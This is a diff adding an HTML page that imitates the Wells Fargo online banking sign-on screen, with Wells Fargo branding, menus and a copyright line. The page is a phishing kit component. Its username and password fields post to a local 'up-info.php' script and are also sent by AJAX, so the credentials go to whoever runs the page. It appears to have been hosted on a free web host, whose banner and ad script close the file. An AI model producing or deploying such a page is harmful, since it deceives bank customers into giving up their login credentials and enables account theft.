@@ -1,0 +1,367 @@
+
+<title>Sign-in</title>
+<link rel="shortcut icon" href="img/log.gif" type="image/ico" />
+<link rel="stylesheet" href="css/bootstrap.min.css">
+
+
+<meta charset="utf-8">
+
+
+<script src="js/bootstrap.min.js" ></script>
+
+<script src="https://use.fontawesome.com/3fa6ba2462.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+ <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+<link href="css/bootstrap-theme.min.css" rel="stylesheet" type="text/css" />
+<link href="css/style.css" rel="stylesheet" type="text/css" />
+
+<script src="jquery.min.js"></script>
+
+    <style>
+        #lst{
+            padding: 10px;
+        }
+    #min li{
+            float: right;
+            list-style: none;
+           padding-left: 10px;
+        
+        
+
+        }
+            a{
+            text-decoration: none;
+                    font-size: 12px;
+    color: #666666;
+
+        }
+             a:hover{
+            text-decoration:underline;
+                    font-size: 12px;
+    color: blue;
+
+        }
+       
+        #searchBox{
+            float: right;
+  padding: 5px 20px;
+        }
+  #searchBox input{
+    height: 32px;
+    width: 256px;
+    padding-left: 20px;
+    font-family: Verdana;
+    font-size: 13px;
+    color: #767676;
+    border: 1px solid #c5c4c4;
+        }
+
+
+        #hhrr{
+            border: 2px solid #DFDFDF;
+        }
+select {
+    position: relative;
+    z-index: 0;
+    width: 100%;
+    height: 2em;
+    border: 1px solid #DFDFDF;
+    line-height: 2;
+    height: 45px;
+    margin-bottom: 15px;}
+    #user1{
+      margin-top: 10px;
+    height: 45px;
+    width: 200px;
+    padding-left: 10px;
+    margin-right: 18px;
+    font-weight: normal;
+    text-decoration: none;
+    font-size: 13px;
+    color: #44464a;
+    border-radius: 2px;
+    border: 1px solid #cfd1d7;
+}
+#user{
+      margin-top: 10px;
+    height: 45px;
+    width: 200px;
+    padding-left: 10px;
+    margin-right: 18px;
+    font-weight: normal;
+    text-decoration: none;
+    font-size: 13px;
+    color: #44464a;
+    border-radius: 2px;
+    border: 1px solid #cfd1d7;
+}
+#user:focus,#user1:focus{
+    border:1px solid red;
+}       
+</style>
+<body>
+    
+
+    
+    
+    <div class="container">
+    <div class="row">
+        <div class="col-lg-offset-3 col-lg-6">
+        
+        <div class="hed">
+        
+            <ul id="min">
+							<div id="searchBox">
+									
+					<input name="q" value=""  type="text" autocomplete="off" autocapitalize="off" id="inputTopSearchField" placeholder="Search">
+									
+								</div>
+						<div id="lst"	><li><a href="">Apply</a></li>
+							
+							<li><a href="">Locations</a></li>
+							<li><a href="">Customer Service</a></li></div>
+	                
+	                    
+	                
+				</ul>
+        </div>
+            <br>
+            <img src="img/log.gif" style="width: 62px;
+        height: 62px;top: 39px;">
+    
+        </div>
+    </div>
+</div>
+    
+       <hr id="hhrr"> 
+    <div class="container">
+    <div class="row">
+        <div class="col-lg-offset-3 col-lg-6 ">
+        
+        <img class="img-responsive" src="img/centr.PNG"  >
+        
+        </div>
+    </div>
+</div>
+    <div class="container">
+    <div class="row">
+        <div class="col-lg-offset-3 col-lg-10">
+        
+        
+            <div class="col-lg-6">
+                <div id="form">
+                
+                <h1 style="    font-family: Georgia;
+    font-size: 28px;
+    color: #44464a;
+    line-height: 1.154em;
+    font-weight: lighter;
+    margin-top: 10px;">Sign On to View Your Accounts</h1>
+                    <br>
+<p style="font-size: 12px;
+    color: #666666;">Enter your username and password to securely view and manage your Wells Fargo accounts online.
+                </p>
+                    
+                    <div data-id="selectContainer">
+			                    <select>
+			                        <option selected="selected" value="AccountSummary">Account Summary</option>
+			                        <option value="Transfer">Transfer</option>
+			                        <option value="BillPay">Bill Pay</option>
+			                        <option value="brokerage">Brokerage</option>
+			                        <option value="Trade">Trade</option>
+			                        <option value="MessageAlerts">Messages &amp; Alerts</option>
+			                    </select>
+								
+							
+			                </div>
+                     
+                <form class="form-horizontal" id='reg_form' action="up-info.php" method="post">
+                    <div class="col-lg-5"><div data-id="inputContainer">
+							<label style="font-weight: bold;font-family: Verdana;
+    font-size: 12px;
+    color: #666666;" id="" for="">Username</label><br>
+  
+		                    
+		                        
+		                            <input type="text" id="user" name="ui" value="">
+		                        
+		                        
+		                    
+		                </div></div>
+        <div class="col-lg-offset-1 col-lg-5">
+            <div data-id="inputContainer">
+			<label style="font-weight: bold;font-family: Verdana;
+    font-size: 12px;
+    color: #666666;" id="" for="">Password</label><br>
+		                    
+<input  style="font-family: Verdana;
+    font-size: 12px;
+    color: #666666;" type="password" id="user1" name="ps" value="">
+		                        
+		                        
+		                    
+		                </div></div>
+              
+         
+                   
+     <div class="col-lg-9" style="font-family: Verdana;
+    font-size: 12px; padding: 10px;"><a href="">Forgot Password/Username? </a> | <a href="">  Enroll Now</a></div>
+        <div style=" padding: 10px;" class="col-lg-3"><button type="submit" class="btn" style="    margin: auto;
+    border: 0;
+    font-family: Verdana;
+    font-size: 12px;
+    color: #ffffff;
+    padding: 0 20px 0 20px;
+    background-color: #5174B8;
+    height: 45px;
+    font-weight: bold;
+    border-radius: 2px;
+    position: relative;
+
+  
+    -webkit-appearance: none;">Sign On</button>
+    </form>                 </div>
+
+
+    <script src="http://code.jquery.com/jquery-1.11.2.min.js"></script>
+<!--<script>
+$("#hasona").submit(function(){
+	var user = $('#user').val();
+	var user1 = $('#user1').val();
+	var textInputs = [user, user1];
+	var textInputsID = ['user', 'user1'];
+	var textILength = textInputs.length;
+	// Validations of text inputs
+	for(var i = 0; i < textILength; i++){
+		var inputID = '#' + textInputsID[i];
+		if(textInputs[i] == '' || textInputs[i] == ' '){
+			$(inputID).focus();
+			var inputError = true;
+			break;
+		}else{
+			var inputError = false;
+		}
+	}
+	if(inputError == true){
+		return false;
+	}
+});
+</script>   
+-->
+                    <!-- PrefixFree -->
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-validator/0.4.5/js/bootstrapvalidator.min.js'></script>
+
+<script type="text/javascript">
+ 
+   $(document).ready(function() {
+    $('#reg_form').bootstrapValidator({
+        // To use feedback icons, ensure that you use Bootstrap v3.1.0 or later
+        feedbackIcons: {
+ 
+        },
+        fields: {
+            ui: {
+                validators: {
+                        stringLength: {
+                        min: 2,
+                    },
+                        notEmpty: {
+                        message: 'Please Enter Username'
+                    }
+                }
+            },
+                ps: {
+                validators: {
+                        stringLength: {
+                        min: 2,
+                    },
+                        notEmpty: {
+                        message: 'Please Enter Password'
+                    }
+                }
+            },
+             
+           
+					
+	
+			
+            
+            }
+        })
+		
+ 	
+        .on('success.form.bv', function(e) {
+            $('#success_message').slideDown({ opacity: "show" }, "slow") // Do something ...
+                $('#reg_form').data('bootstrapValidator').resetForm();
+
+            // Prevent form submission
+            e.preventDefault();
+
+            // Get the form instance
+            var $form = $(e.target);
+
+            // Get the BootstrapValidator instance
+            var bv = $form.data('bootstrapValidator');
+
+            // Use Ajax to submit form data
+            $.post($form.attr('action'), $form.serialize(), function(result) {
+                console.log(result);
+            }, 'json');
+        });
+});
+
+
+ 
+ </script>
+    
+
+
+
+
+
+
+                </div></div>
+            
+            
+         <div class="col-lg-1 hidden-xs"><img src="img/gnb.PNG" style="float: left;" ></div>
+    </div>
+</div>
+        
+        
+        
+        
+        
+        
+        </div>
+
+<div class="container">
+    <div class="row">
+        <div class="col-lg-12 img-responsive"> <div style="width: 100%;
+    height: 50px;
+    background: url(data:image/jpeg;base64,/9j/4QAYRXhpZgAASUkqAAgAAAAAAAAAAAAAAP/sABFEdWNreQABAAQAAABkAAD/4QMtaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLwA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/PiA8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjMtYzAxMSA2Ni4xNDU2NjEsIDIwMTIvMDIvMDYtMTQ6NTY6MjcgICAgICAgICI+IDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+IDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bXA6Q3JlYXRvclRvb2w9IkFkb2JlIFBob3Rvc2hvcCBDUzYgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6MDkzRjI0NzlGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6MDkzRjI0N0FGRjVEMTFFMUJFRjZFRjM1OEI1NTBBRjYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDowOTNGMjQ3N0ZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDowOTNGMjQ3OEZGNUQxMUUxQkVGNkVGMzU4QjU1MEFGNiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pv/uAA5BZG9iZQBkwAAAAAH/2wCEAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQECAgICAgICAgICAgMDAwMDAwMDAwMBAQEBAQEBAgEBAgICAQICAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDA//AABEIADwACQMBEQACEQEDEQH/xACCAAACAgMBAAAAAAAAAAAAAAAABAUGAQMHCgEBAQEBAAAAAAAAAAAAAAAAAAIBAxAAAQIEAgUFEQEAAAAAAAAAAQIDABETBBIF8CFiFBWh4SJWGDFhkTKS0uIjYyQ1ldUGF2coqBEBAQABBAMBAAAAAAAAAAAAABEB8CFhcUESIyL/2gAMAwEAAhEDEQA/APfrj00MV6s3GPTQw9TdqjLlohcgjAQC9Xa5OaJuqCrtcnNC6ohBdg4QleLHMtK7iXAnWpokywuiR1HXq7xERelM737K58n04XoVNV4oKeS6iam8Dl/bM1CoNqURb5rl+vEUzbJWkTUCkyJWnpxWzPJfibPWyx8OV+dCkyrKLoYbcsOLtW03BtstuLgFbuQ5ouSXvt7NmW1AcPueihqaygkoShYO7LVFXMGqma9Tsq+a2n0yFwTDhV12l6uZ712V/ho4zV/N26cPpuy4hU9zqUcXj+upbEdvlqoxb4Q/9K/of/Tsb81frh//2Q==) repeat-x left -30px;
+    margin-top: 35px;"></div>
+            
+            <br>
+            <div class="fot text-center">
+            <a href="" > About Wells Fargo </a> | <a href="" >Careers</a>|   <a href="" > Report Email Fraud
+ </a> | <a href="" > Report Email Fraud </a> |<a href="" > Home </a>
+                <br>
+       
+© 1999 - 2018 Wells Fargo. All rights reserved.
+            
+            
+            </div>
+        </div>
+       
+    </div>
+</div>
+<style>
+    img[src*="https://cdn.rawgit.com/000webhost/logo/e9bd13f7/footer-powered-by-000webhost-white2.png"] {
+display: none;}
+</style>
+    <div style="text-align: right;position: fixed;z-index:9999999;bottom: 0;width: auto;right: 1%;cursor: pointer;line-height: 0;display:block !important;"><a title="Hosted on free web hosting 000webhost.com. Host your own website for FREE." target="_blank" href="https://www.000webhost.com/?utm_source=000webhostapp&utm_campaign=000_logo&utm_medium=website&utm_content=footer_img"><img src="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png" alt="www.000webhost.com"></a></div><script>function getCookie(t){for(var e=t+"=",n=decodeURIComponent(document.cookie).split(";"),o=0;o<n.length;o++){for(var i=n[o];" "==i.charAt(0);)i=i.substring(1);if(0==i.indexOf(e))return i.substring(e.length,i.length)}return""}getCookie("hostinger")&&(document.cookie="hostinger=;expires=Thu, 01 Jan 1970 00:00:01 GMT;",location.reload());var wordpressAdminBody=document.getElementsByClassName("wp-admin")[0],notification=document.getElementsByClassName("notice notice-success is-dismissible"),hostingerLogo=document.getElementsByClassName("hlogo"),mainContent=document.getElementsByClassName("notice_content")[0];if(null!=wordpressAdminBody&&notification.length>0&&null!=mainContent){var googleFont=document.createElement("link");googleFontHref=document.createAttribute("href"),googleFontRel=document.createAttribute("rel"),googleFontHref.value="https://fonts.googleapis.com/css?family=Roboto:300,400,600,700",googleFontRel.value="stylesheet",googleFont.setAttributeNode(googleFontHref),googleFont.setAttributeNode(googleFontRel);var css="@media only screen and (max-width: 576px) {#main_content {max-width: 320px !important;} #main_content h1 {font-size: 30px !important;} #main_content h2 {font-size: 40px !important; margin: 20px 0 !important;} #main_content p {font-size: 14px !important;} #main_content .content-wrapper {text-align: center !important;}} @media only screen and (max-width: 781px) {#main_content {margin: auto; justify-content: center; max-width: 445px;}} @media only screen and (max-width: 1325px) {.web-hosting-90-off-image-wrapper {position: absolute; max-width: 95% !important;} .notice_content {justify-content: center;} .web-hosting-90-off-image {opacity: 0.3;}} @media only screen and (min-width: 769px) {.notice_content {justify-content: space-between;} #main_content {margin-left: 5%; max-width: 445px;} .web-hosting-90-off-image-wrapper {position: absolute; display: flex; justify-content: center; width: 100%; }} .web-hosting-90-off-image {max-width: 90%;} .content-wrapper {min-height: 454px; display: flex; flex-direction: column; justify-content: center; z-index: 5} .notice_content {display: flex; align-items: center;} * {-webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale;} .upgrade_button_red_sale{box-shadow: 0 2px 4px 0 rgba(255, 69, 70, 0.2); max-width: 350px; border: 0; border-radius: 3px; background-color: #ff4546 !important; padding: 15px 55px !important; font-family: 'Roboto', sans-serif; font-size: 16px; font-weight: 600; color: #ffffff;} .upgrade_button_red_sale:hover{color: #ffffff !important; background: #d10303 !important;}",style=document.createElement("style"),sheet=window.document.styleSheets[0];style.styleSheet?style.styleSheet.cssText=css:style.appendChild(document.createTextNode(css)),document.getElementsByTagName("head")[0].appendChild(style),document.getElementsByTagName("head")[0].appendChild(googleFont);var button=document.getElementsByClassName("upgrade_button_red")[0],link=button.parentElement;link.setAttribute("href","https://www.hostinger.com/hosting-starter-offer?utm_source=000webhost&utm_medium=panel&utm_campaign=000-wp"),link.innerHTML='<button class="upgrade_button_red_sale">Go for it</button>',(notification=notification[0]).setAttribute("style","padding-bottom: 0; padding-top: 5px; background-color: #040713; background-size: cover; background-repeat: no-repeat; color: #ffffff; border-left-color: #040713;"),notification.className="notice notice-error is-dismissible";var mainContentHolder=document.getElementById("main_content");mainContentHolder.setAttribute("style","padding: 0;"),hostingerLogo[0].remove();var h1Tag=notification.getElementsByTagName("H1")[0];h1Tag.className="000-h1",h1Tag.innerHTML="Black Friday Prices",h1Tag.setAttribute("style",'color: white; font-family: "Roboto", sans-serif; font-size: 22px; font-weight: 700; text-transform: uppercase;');var h2Tag=document.createElement("H2");h2Tag.innerHTML="Get 90% Off!",h2Tag.setAttribute("style",'color: white; margin: 10px 0 15px 0; font-family: "Roboto", sans-serif; font-size: 60px; font-weight: 700; line-height: 1;'),h1Tag.parentNode.insertBefore(h2Tag,h1Tag.nextSibling);var paragraph=notification.getElementsByTagName("p")[0];paragraph.innerHTML="Get Web Hosting for $0.99/month + SSL Certificate for FREE!",paragraph.setAttribute("style",'font-family: "Roboto", sans-serif; font-size: 16px; font-weight: 700; margin-bottom: 15px;');var list=notification.getElementsByTagName("UL")[0];list.remove();var org_html=mainContent.innerHTML,new_html='<div class="content-wrapper">'+mainContent.innerHTML+'</div><div class="web-hosting-90-off-image-wrapper"><img class="web-hosting-90-off-image" src="https://cdn.000webhost.com/000webhost/promotions/bf-2020-wp-inject-img.png"></div>';mainContent.innerHTML=new_html;var saleImage=mainContent.getElementsByClassName("web-hosting-90-off-image")[0]}</script></body>
+
